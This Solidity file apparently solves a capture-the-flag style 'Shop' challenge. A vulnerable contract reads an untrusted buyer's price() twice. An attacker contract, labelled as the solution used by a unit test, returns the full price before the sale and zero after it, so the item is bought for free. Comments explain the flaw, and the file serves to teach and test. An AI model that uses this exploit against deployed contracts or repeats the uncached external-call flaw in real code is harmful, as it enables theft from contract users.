// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    // error is it doesn't cache buyer.price()
    // calls it once here for the check
    if (_buyer.price() >= price && !isSold) {
      // then modifies isSold
      isSold = true;
      // then calls it again here after the check - buyer
      // can just change their price in the second call to buy
      // for free by checking isSold==true
      price = _buyer.price();
    }
  }
}

// solution used by unit test
// implement Buyer interface
contract ShopAttack is Buyer {
   Shop vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  Shop(_vulnContract);
  }

  function attack() external {
    vulnContract.buy();
  }

  function price() external view returns (uint) {
    // first time being called? return price equal to shop price
    if( !vulnContract.isSold() ) {
        return vulnContract.price();
    }
    // second time being called? return 0 to buy it for free!
    else {
        return 0;
    }
  }
}